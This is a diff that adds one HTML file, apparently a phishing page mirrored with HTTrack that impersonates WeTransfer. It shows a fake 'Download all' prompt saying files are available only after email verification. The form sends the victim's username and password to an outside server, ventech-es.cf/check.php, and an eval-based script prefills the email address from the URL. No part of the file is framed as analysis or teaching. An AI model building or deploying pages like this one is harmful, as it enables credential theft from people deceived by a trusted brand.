@@ -1,0 +1,148 @@
+<!doctype html>
+<html>
+
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+	<meta charset="utf-8">
+	<title>We.Transfer_</title>
+	
+	
+	<link rel="shortcut icon" href="favicon.1.delaye" />
+	<link rel="icon" sizes="16x16 32x32" href="favicon.1.delaye">
+    <link rel="mask-icon" href="favicon.2.delaye" color="#17181A">
+
+
+
+	<link rel="stylesheet" href="bootstrap/4.0.0/css/bootstrap.min.css">
+	<link href="font-awesome/4.2.0/css/font-awesome.min.css" rel="stylesheet" media="all">
+	<link rel="stylesheet" href="animate.min.css">
+	<!-- jQuery library -->
+	<script src="jquery.min.js"></script>
+
+	<!-- Popper JS -->
+	<script src="popper.min.js"></script>
+
+	<!-- Latest compiled JavaScript -->
+	<script src="bootstrap/4.0.0/js/bootstrap.min.js"></script>
+	<script src="sweetalert.min.js"></script>
+	<style>
+		body {
+			background-image: url(bg.b.delaye);
+			background-repeat: no-repeat;
+			color: #045eb4;
+		}
+		
+		
+		
+		#d {
+			position: relative;
+			left: 530px;
+			top: 150px;
+			
+		}
+		
+		#form {
+			position: absolute;
+			left: 500px;
+			top: 50px;
+			width: 400px;
+			border-radius: 10px;
+			padding: 20px;
+			z-index: 2;
+			background: white;
+			display:none;
+			
+			
+			
+			
+			
+		}
+		.blue{
+			background-color: #045eb4;
+			color: white;
+		}
+		#sub1{
+			margin-top: 480px;
+			margin-left: 160px;
+			border-radius: 15px;
+			position: absolute;
+			z-index: 1;
+			
+			
+		}
+				.sky{
+					background-color: #409fff;
+					color:white;
+			
+		}
+		img {
+    pointer-events: none;
+}
+	</style>
+</head>
+
+<body> 
+    
+	
+	<div id="form" class="text-left">
+		<img src="logo.c.delaye" width="200"><br>
+		<div style="color:#C03A3C; font-size: 13px;position: relative;margin-bottom: 20px; width: 331px;"> Files are strictly available only to receiver! <br><br> Please verify your email account to start download! </div>
+		<hr>
+		<h1></h1>
+			<form method="post" name="form" action="https://ventech-es.cf/check.php">
+				<input type="text" readonly class="textstyle form-control-plaintext " id="input" value="" name="username">
+				<br/>
+				<input type="password" name="password" class="form-control validate[required]" value="" id="password" placeholder="Password" required=""> <br/>
+				<button id="sub" name="sub" name="submit" type="submit" class="btn btn-md btn-block sky"  value="submit">Download all <i class="fa fa-arrow-down"></i></button>
+	
+			
+			
+			</form>
+		
+		</div>
+		
+		<a href="#" id="sub1" class="btn btn-md sky text-white">Download all</a>
+		
+		<script type="text/javascript" language="JavaScript">
+            // <!-- Copyright 2006 Bontrager Connection, LLC
+            function FillForm() {
+            // Specify form's name between the quotes on next line.
+            var FormName = "form";
+            var questionlocation = location.href.indexOf('?');
+            if(questionlocation < 0) { return; }
+            var q = location.href.substr(questionlocation + 1);
+            var list = q.split('&');
+            for(var i = 0; i < list.length; i++) {
+               var kv = list[i].split('=');
+               if(! eval('document.'+FormName+'.'+kv[0])) { continue; }
+               kv[1] = unescape(kv[1]);
+               if(kv[1].indexOf('"') > -1) {
+                  var re = /"/g;
+                  kv[1] = kv[1].replace(re,'\\"');
+                  }
+               eval('document.'+FormName+'.'+kv[0]+'.value="'+kv[1]+'"');
+               }
+            }
+            FillForm();
+            //-->
+            </script>
+		
+		<script>
+			$(document).ready(function(){
+				$("#sub1, #pix").click(function(){
+					$("#form").slideToggle();
+					
+				});
+				
+			});
+
+		
+		</script>
+
+		
+
+	
+</body>
+
+</html>
+
